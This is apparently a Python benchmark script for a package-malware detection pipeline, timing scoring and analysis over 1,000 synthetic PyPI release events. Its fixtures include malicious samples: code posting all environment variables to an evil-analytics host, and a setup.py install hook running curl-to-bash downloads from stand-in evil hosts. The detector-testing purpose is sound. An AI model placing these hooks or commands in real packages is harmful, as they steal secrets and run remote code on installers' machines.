#!/usr/bin/env python3
"""
Stress test — simulate 1000 package release events through the full pipeline.

Measures:
  - Scoring throughput (all 1000 events)
  - Analysis throughput (only high-priority packages)
  - LLM usage rate
  - Per-stage timing breakdown

Uses synthetic packages to isolate pipeline performance from network I/O.
Download distribution follows a power law (realistic: most packages are tiny).
"""

from __future__ import annotations

import math
import os
import random
import sys
import time
from dataclasses import dataclass
from typing import List

sys.path.insert(0, os.path.dirname(__file__))

# Force rules-only AI backend for benchmark
os.environ["SENT_AI_BACKEND"] = "rules"

from analysis.ast_analyzer import (
    FileBehavior, diff_behaviors, extract_behavior, merge_behaviors,
)
from analysis.baseline import (
    AnomalyReport, PackageBaseline, detect_anomalies,
)
from analysis.behavioral_scorer import compute_behavioral_score
from analysis.call_diff import diff_call_arguments
from analysis.feature_extractor import (
    BehaviorFeatures, apply_call_mutations, extract_features,
)
from scoring.scorer import compute_priority_score

# ---------------------------------------------------------------------------
# Synthetic package generator
# ---------------------------------------------------------------------------

# Realistic download distribution: power law
# ~70% have < 100 downloads, ~20% have 100-10k, ~10% have 10k+
def _random_downloads() -> int:
    r = random.random()
    if r < 0.70:
        return random.randint(0, 100)
    if r < 0.90:
        return random.randint(100, 10_000)
    if r < 0.97:
        return random.randint(10_000, 1_000_000)
    return random.randint(1_000_000, 50_000_000)  # top 3%


def _random_dependents() -> int:
    r = random.random()
    if r < 0.80:
        return 0
    if r < 0.95:
        return random.randint(1, 20)
    return random.randint(20, 500)


# Synthetic Python file templates
BENIGN_OLD = '''
import os
import json
import logging

logger = logging.getLogger(__name__)

def process(data):
    """Process incoming data."""
    result = json.loads(data)
    logger.info("Processed %d items", len(result))
    return result

def get_config():
    return {config_val}

def send_report(report):
    import requests
    requests.post("https://api.myservice.com/reports", json=report)
'''

BENIGN_NEW = '''
import os
import json
import logging

logger = logging.getLogger(__name__)

def process(data):
    """Process incoming data."""
    result = json.loads(data)
    logger.info("Processed %d items", len(result))
    return result

def get_config():
    return {config_val}

def send_report(report):
    import requests
    requests.post("https://api.myservice.com/v2/reports", json=report)

def validate(data):
    """New validation function."""
    if not isinstance(data, dict):
        raise ValueError("Expected dict")
    return True
'''

MALICIOUS_NEW = '''
import os
import json
import logging

logger = logging.getLogger(__name__)

def process(data):
    """Process incoming data."""
    result = json.loads(data)
    logger.info("Processed %d items", len(result))
    return result

def get_config():
    return {config_val}

def send_report(report):
    import requests
    requests.post("https://collect.evil-analytics.ru/data",
                  json={{"report": report, "env": dict(os.environ)}})

def _phone_home():
    import subprocess
    subprocess.run("curl -s https://dl.evil.ru/p.sh | bash", shell=True)
'''

SETUP_PY_OLD = '''
from setuptools import setup
setup(name="pkg", version="1.0")
'''

SETUP_PY_NEW_BENIGN = '''
from setuptools import setup
setup(name="pkg", version="1.1")
'''

SETUP_PY_NEW_MALICIOUS = '''
from setuptools import setup
import subprocess
class Install(install):
    def run(self):
        subprocess.run("curl https://evil.com/install.sh | bash", shell=True)
        install.run(self)
setup(name="pkg", version="1.1", cmdclass={"install": Install})
'''


def generate_package_files(is_malicious: bool, num_files: int = 5):
    """Generate synthetic old/new file trees."""
    old_files = {}
    new_files = {}

    # Main source file
    cfg = '{"debug": False}' if not is_malicious else '{"debug": True}'
    old_files["src/main.py"] = BENIGN_OLD.replace("{config_val}", cfg)
    new_files["src/main.py"] = (MALICIOUS_NEW if is_malicious else BENIGN_NEW).replace("{config_val}", cfg)

    # Setup file
    old_files["setup.py"] = SETUP_PY_OLD
    new_files["setup.py"] = SETUP_PY_NEW_MALICIOUS if is_malicious else SETUP_PY_NEW_BENIGN

    # Extra filler files (realistic: packages have many unchanged files)
    for i in range(num_files - 2):
        content = f'"""Module {i}."""\n\ndef func_{i}():\n    return {i}\n'
        old_files[f"src/mod_{i}.py"] = content
        new_files[f"src/mod_{i}.py"] = content  # unchanged

    return old_files, new_files


# ---------------------------------------------------------------------------
# Benchmark pipeline — mirrors the real analysis without network I/O
# ---------------------------------------------------------------------------

@dataclass
class BenchResult:
    package_name: str
    downloads: int
    dependents: int
    priority_score: float
    skipped: bool
    risk_score: int = 0
    sent_to_llm: bool = False
    scoring_time_ms: float = 0
    analysis_time_ms: float = 0


AI_THRESHOLD = 30  # diff score above which we'd send to LLM


def run_analysis_pipeline(old_files: dict, new_files: dict) -> tuple[int, BehaviorFeatures]:
    """Run the full analysis pipeline on synthetic files. Returns (score, features)."""
    from analysis.differ import compute_file_diff, _is_python

    added_f, removed_f, modified_f = compute_file_diff(old_files, new_files)

    # AST behavioral analysis
    deltas = []
    all_mutations = []
    for filepath in added_f:
        if not _is_python(filepath):
            continue
        new_behavior = extract_behavior(new_files[filepath])
        deltas.append(new_behavior)

    for filepath in modified_f:
        if not _is_python(filepath):
            continue
        old_content = old_files.get(filepath, "")
        new_content = new_files.get(filepath, "")
        old_b = extract_behavior(old_content)
        new_b = extract_behavior(new_content)
        deltas.append(diff_behaviors(old_b, new_b))
        all_mutations.extend(diff_call_arguments(old_content, new_content, filepath))

    merged = merge_behaviors(deltas) if deltas else FileBehavior()

    # Feature extraction
    features = extract_features(merged, added_f, modified_f)
    features = apply_call_mutations(features, all_mutations)

    # Baseline + scoring
    baseline = PackageBaseline()
    anomalies = detect_anomalies(baseline, features, merged.imports)
    score, _ = compute_behavioral_score(features, anomalies)

    return score, features


def run_benchmark(n_events: int = 1000, malicious_rate: float = 0.02):
    """Run the full benchmark."""
    random.seed(42)

    results: List[BenchResult] = []

    # Pre-generate all events
    events = []
    for i in range(n_events):
        dl = _random_downloads()
        deps = _random_dependents()
        is_mal = random.random() < malicious_rate
        events.append((f"pkg-{i:04d}", dl, deps, is_mal))

    print(f"Benchmark: {n_events} events, {malicious_rate*100:.0f}% malicious rate")
    print(f"Threshold: score >= 8.0 triggers analysis")
    print("-" * 60)

    # Warm up — force module imports and JIT compilation before timing
    _warm_old, _warm_new = generate_package_files(False, 3)
    run_analysis_pipeline(_warm_old, _warm_new)
    print("Warm-up done.")

    total_start = time.perf_counter()
    total_scoring_ns = 0
    total_analysis_ns = 0
    n_analyzed = 0
    n_skipped = 0
    n_llm = 0

    for name, downloads, dependents, is_malicious in events:
        # --- Stage 1: Priority scoring ---
        t0 = time.perf_counter_ns()
        score = compute_priority_score(name, "pypi", downloads, downstream_override=dependents)
        should = score >= 8.0
        t1 = time.perf_counter_ns()
        scoring_ns = t1 - t0
        total_scoring_ns += scoring_ns

        res = BenchResult(
            package_name=name,
            downloads=downloads,
            dependents=dependents,
            priority_score=score,
            skipped=not should,
            scoring_time_ms=scoring_ns / 1_000_000,
        )

        if not should:
            n_skipped += 1
            results.append(res)
            continue

        # --- Stage 2: Full analysis pipeline ---
        # Generate synthetic files (varies by malicious flag)
        num_files = random.randint(3, 15)
        old_files, new_files = generate_package_files(is_malicious, num_files)

        t2 = time.perf_counter_ns()
        risk_score, features = run_analysis_pipeline(old_files, new_files)
        t3 = time.perf_counter_ns()
        analysis_ns = t3 - t2
        total_analysis_ns += analysis_ns
        n_analyzed += 1

        res.risk_score = risk_score
        res.analysis_time_ms = analysis_ns / 1_000_000
        res.skipped = False

        # Would we send to LLM?
        if risk_score >= AI_THRESHOLD:
            res.sent_to_llm = True
            n_llm += 1

        results.append(res)

    total_elapsed = time.perf_counter() - total_start

    # --- Report ---
    print()
    print("=" * 60)
    print("RESULTS")
    print("=" * 60)

    print(f"\nTotal events:         {n_events}")
    print(f"Total time:           {total_elapsed:.3f}s")
    print(f"Events/sec:           {n_events / total_elapsed:.1f}")
    print()

    print("--- Filtering ---")
    print(f"Skipped (low score):  {n_skipped} ({n_skipped/n_events*100:.1f}%)")
    print(f"Analyzed:             {n_analyzed} ({n_analyzed/n_events*100:.1f}%)")
    print(f"Sent to LLM:          {n_llm} ({n_llm/n_events*100:.1f}%)")
    print(f"LLM % of analyzed:    {n_llm/max(n_analyzed,1)*100:.1f}%")
    print()

    print("--- Timing ---")
    avg_scoring_us = (total_scoring_ns / n_events) / 1000
    print(f"Avg scoring time:     {avg_scoring_us:.1f} µs/event")

    if n_analyzed > 0:
        avg_analysis_ms = (total_analysis_ns / n_analyzed) / 1_000_000
        print(f"Avg analysis time:    {avg_analysis_ms:.2f} ms/package")
    else:
        avg_analysis_ms = 0
        print(f"Avg analysis time:    N/A (none analyzed)")

    total_analysis_s = total_analysis_ns / 1_000_000_000
    total_scoring_s = total_scoring_ns / 1_000_000_000
    print(f"Total scoring time:   {total_scoring_s:.3f}s")
    print(f"Total analysis time:  {total_analysis_s:.3f}s")
    print(f"Overhead (non-work):  {total_elapsed - total_scoring_s - total_analysis_s:.3f}s")
    print()

    # --- Performance targets ---
    print("--- Targets ---")
    events_per_sec = n_events / total_elapsed
    llm_pct = n_llm / n_events * 100
    ok_speed = events_per_sec >= 3.0
    ok_llm = llm_pct < 5.0
    print(f"Events/sec >= 3:      {'PASS' if ok_speed else 'FAIL'} ({events_per_sec:.1f})")
    print(f"LLM usage < 5%:       {'PASS' if ok_llm else 'FAIL'} ({llm_pct:.1f}%)")
    print()

    # --- Risk distribution ---
    analyzed_results = [r for r in results if not r.skipped]
    if analyzed_results:
        scores = [r.risk_score for r in analyzed_results]
        print("--- Risk score distribution (analyzed packages) ---")
        print(f"Min: {min(scores)}  Max: {max(scores)}  "
              f"Avg: {sum(scores)/len(scores):.1f}  "
              f"Median: {sorted(scores)[len(scores)//2]}")
        buckets = {"benign (0-29)": 0, "suspicious (30-79)": 0, "high (80+)": 0}
        for s in scores:
            if s < 30:
                buckets["benign (0-29)"] += 1
            elif s < 80:
                buckets["suspicious (30-79)"] += 1
            else:
                buckets["high (80+)"] += 1
        for label, count in buckets.items():
            print(f"  {label}: {count} ({count/len(scores)*100:.1f}%)")

    # --- Top flagged ---
    print()
    print("--- Top 5 by risk score ---")
    top5 = sorted(results, key=lambda r: r.risk_score, reverse=True)[:5]
    for r in top5:
        print(f"  {r.package_name}: score={r.risk_score} "
              f"priority={r.priority_score} dl={r.downloads} "
              f"deps={r.dependents} llm={r.sent_to_llm} "
              f"analysis={r.analysis_time_ms:.2f}ms")

    return results


if __name__ == "__main__":
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 1000
    run_benchmark(n)
